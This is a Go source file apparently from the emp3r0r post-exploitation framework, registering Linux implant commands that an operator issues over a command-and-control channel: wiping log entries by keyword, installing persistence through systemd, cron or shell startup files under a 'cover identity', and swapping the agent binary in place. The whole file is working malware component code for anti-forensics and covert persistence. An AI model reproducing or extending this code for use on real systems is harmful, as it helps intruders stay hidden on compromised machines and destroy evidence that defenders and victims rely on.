//go:build linux

package handler

import (
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/spf13/cobra"
)

func platformCommands(cmd *cobra.Command) {
	// !clean_log --keyword <keyword>
	cleanLogCmd := &cobra.Command{
		Use:     def.C2CmdCleanLog,
		Short:   "Clean logs",
		Example: "!clean_log --keyword <keyword>",
		GroupID: "linux",
		Run:     runCleanLogLinux,
	}
	cleanLogCmd.Flags().StringP("keyword", "k", "", "Keyword to clean logs")
	cmd.AddCommand(cleanLogCmd)

	// !persist [install|status|remove] --method <auto|systemd|cron|shellrc>
	// Explicit operator-ordered persistence, never automatic: installs
	// user-level autostart under the running cover identity. See
	// persist_linux.go.
	persistCmd := &cobra.Command{
		Use:     def.C2CmdPersist,
		Short:   "Persistence: install/status/remove user-level autostart",
		Example: "!persist install --method auto | !persist status | !persist remove",
		GroupID: "linux",
		Run:     runPersist,
	}
	persistCmd.Flags().StringP("method", "m", "auto", "Persistence mechanism: auto|systemd|cron|shellrc")
	cmd.AddCommand(persistCmd)

	// !update --file <path>
	// In-place upgrade from a build pushed via the file manager. Keeps the
	// persistence copy (if any) in sync and restarts into the new binary.
	updateCmd := &cobra.Command{
		Use:     def.C2CmdUpdate,
		Short:   "Upgrade this agent in place from an uploaded build",
		Example: "!update --file /tmp/agent_linux_amd64_2026-9-20_1-4-1",
		GroupID: "linux",
		Run:     runUpdate,
	}
	updateCmd.Flags().StringP("file", "f", "", "Path to the uploaded new agent binary")
	cmd.AddCommand(updateCmd)
}

// runCleanLogLinux implements: !clean_log --keyword <keyword>
func runCleanLogLinux(cmd *cobra.Command, args []string) {
	keyword, _ := cmd.Flags().GetString("keyword")
	if keyword == "" {
		c2transport.NotifyC2(cmd, "Error: args error: keyword is required: %s", args)
		return
	}
	err := modules.CleanAllByKeyword(keyword)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	c2transport.NotifyC2(cmd, "%s", "Done")
}
